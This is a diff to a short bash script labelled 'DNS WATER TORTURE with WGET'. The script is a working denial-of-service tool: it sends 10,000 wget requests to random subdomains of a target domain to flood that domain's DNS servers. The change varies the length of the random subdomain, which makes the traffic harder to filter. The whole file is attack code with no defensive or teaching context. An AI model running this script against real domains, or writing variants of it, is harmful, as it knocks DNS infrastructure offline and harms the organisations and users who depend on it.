@@ -1,7 +1,7 @@
 #!/bin/bash
 # Christopher Gray
 # Update: 2/22/20
-# Version: 0.8.3
+# Version: 0.8.5
 #---------------------------------------
 # DNS WATER TORTURE with WGET
 
@@ -18,7 +18,11 @@ fi
 for (( c=1; c<=10000; c++ ))
 do
    #wget -O /dev/null $RANDOM.$DomainName
-   NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
-   echo $NEW_UUID_MORE_CHARACTERS.$DomainName
+   #NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32);
+
+   RandomInt=$((RANDOM%20+6));
+   NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c $RandomInt);
+   echo http://$NEW_UUID_MORE_CHARACTERS.$DomainName
+   
    wget -O /dev/null http://$NEW_UUID_MORE_CHARACTERS.$DomainName
 done
